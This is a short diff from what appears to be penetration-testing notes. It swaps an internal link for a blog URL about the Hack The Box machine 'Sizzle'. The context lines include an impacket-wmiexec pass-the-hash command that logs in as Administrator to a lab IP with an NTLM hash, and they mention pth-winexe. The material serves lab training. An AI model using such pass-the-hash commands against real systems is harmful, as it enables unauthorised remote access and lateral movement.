@@ -24,7 +24,7 @@ Examples:
 impacket-wmiexec htb.local/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267
 ```
 Examples:
-[[Sizzle#^59aa0a]]
+[Sizzle](https://shuciran.github.io/posts/Sizzle/#fnref:impacket-wmiexec)
 
 ### PtH
 We can use _pth-winexe_ from the Passing-The-Hash toolkit, just as we did when we passed the hash to a non-domain joined user in the Password Attacks module:
